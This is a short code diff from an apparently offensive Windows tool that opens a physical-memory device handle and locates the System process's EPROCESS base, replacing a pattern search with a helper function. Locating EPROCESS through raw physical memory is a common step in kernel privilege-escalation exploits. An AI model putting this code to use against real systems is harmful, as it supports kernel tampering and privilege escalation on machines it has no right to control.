@@ -57,7 +57,8 @@ int main(int argc, char** argv)
 	};
 	//UCHAR PriorityClass;
 	patt[15] = 0x02;
-
+	/*
+	
 	std::vector <unsigned __int64> locations;
 	if (searchPhysicalMemory(patt, 16, hPhysicalMemory, locations) == -1) {
 		fprintf(stderr, "[!] searchPhysicalMemory failed.\n");
@@ -68,7 +69,10 @@ int main(int argc, char** argv)
 	//0x13aa7e5e7 - 0x13aa7e040 = 0x5A7 (Just a example to calculate the offset)
 	unsigned __int64 EPROCESSBaseOfSystem = patternLocation - 0x5A7;
 	printf("\n------------------------------------\nEPROCESS Base of System: %p\n", (void*)EPROCESSBaseOfSystem);
+	*/
 
+	unsigned __int64 eproc = GetEPROCESSPhysicalBase(NULL, 0, hPhysicalMemory);
+	printf("\n------------------------------------\nEPROCESS Base of System: %p\n", (void*)eproc);
 
 	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
 	CloseHandle(device);
